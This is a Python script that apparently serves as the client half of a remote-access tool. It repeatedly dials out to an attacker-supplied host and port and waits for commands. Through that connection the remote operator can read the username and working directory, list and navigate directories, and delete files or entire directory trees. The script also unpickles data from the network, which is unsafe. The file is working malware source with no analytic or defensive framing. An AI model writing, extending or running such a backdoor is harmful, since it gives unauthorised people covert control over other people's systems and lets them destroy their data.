#!/usr/bin/python3.9
# -*- coding: utf-8 -*-

import os
import shutil
import sys
import zlib
import pickle
import time
import random
import socket
import struct
import glob


def connect_to_server(server_socket, LHOST, LPORT):
    try:
        server_socket.connect((LHOST, LPORT))
        return True
    except:
        return False


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.settimeout(60)
BUFFER_SIZE = 1024

while not connect_to_server(server_socket, sys.argv[1], int(sys.argv[2])) == True:
    time.sleep(5)

def recv_data():
    try:
        SOCKET_TERMINATOR = server_socket.recv(1024).strip()
        print(SOCKET_TERMINATOR)
        SOCKET_TERMINATOR = pickle.loads(SOCKET_TERMINATOR)
        if SOCKET_TERMINATOR[0].upper() == 'SOCKET_TERMINATOR':
            SOCKET_TERMINATOR = SOCKET_TERMINATOR[1]
        else:
            return ''
    except:
        return ''

    data = b''
    buffer = b''

    try:
        while not SOCKET_TERMINATOR.encode('UTF-8') in buffer:
            buffer = server_socket.recv(BUFFER_SIZE)
            print("Buffer: " + buffer.decode('UTF-8'))
            if SOCKET_TERMINATOR.encode('UTF-8') in buffer:
                buffer = buffer[:-len(SOCKET_TERMINATOR)]
                data += buffer
                break
            data += buffer
            print("Data: ", data)
            return data
    except socket.timeout:
        return ''


def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def main():
    try:
        cmd = recv_msg(server_socket)
    except socket.timeout:
        return
    print("Command: ", cmd)
    if cmd == b'whoami':
        send_msg(server_socket, str(os.getlogin()).encode('UTF-8'))
    elif cmd == b'exit':
        server_socket.close()
        sys.exit(0)
    elif cmd == b'pwd':
        try:
            pwd = os.getcwd()
            send_msg(server_socket, bytes(pwd, 'utf-8'))
        except Exception:
            return
    else:
        try:
            cmd = pickle.loads(cmd)
            if cmd[0] == "ls":
                path = cmd[1]
                try:
                    ls = os.listdir(path)
                    status = "0"
                except FileNotFoundError:
                    status = "1"
                except PermissionError:
                    status = "2"
                except NotADirectoryError:
                    status = "4"
                except Exception:
                    status = "U"
                finally:
                    server_socket.send(status.encode('UTF-8'))
                    if status == "0":
                        if cmd[2] == False:
                            ls = pickle.dumps(ls)
                            send_msg(server_socket, ls)
                        else:
                            long_list = list()
                            for elem in ls:
                                info = os.stat(os.path.join(path, elem))
                                long_list.append([elem, info, os.path.isdir(os.path.join(path, elem))])
                            long_list = pickle.dumps(long_list)
                            send_msg(server_socket, long_list)
                    else:
                        return

            elif cmd[0] == "cd":
                path = cmd[1]
                try:
                    os.chdir(path)
                    status = "0"
                except FileNotFoundError:
                    status = "1"
                except PermissionError:
                    status = "2"
                except NotADirectoryError:
                    status = "4"
                except Exception:
                    status = "U"
                finally:
                    server_socket.send(status.encode('UTF-8'))
            
            elif cmd[0] == "rm":
                path = cmd[1]
                try:
                    os.remove(path)
                    status = "0"
                except FileNotFoundError:
                    status = "1"
                except PermissionError:
                    status = "2"
                except IsADirectoryError:
                    if cmd[2] == True:
                        try:
                            shutil.rmtree(path)
                            status = "0"
                        except PermissionError:
                            status = "2"
                        except FileNotFoundError:
                            status = "1"
                        except Exception:
                            status = "U"
                    else:
                        status = "3"
                except Exception:
                    status = "U"
                finally:
                    server_socket.send(status.encode('UTF-8'))
        except Exception:
            return

if __name__ == '__main__':
    while True:
        main()
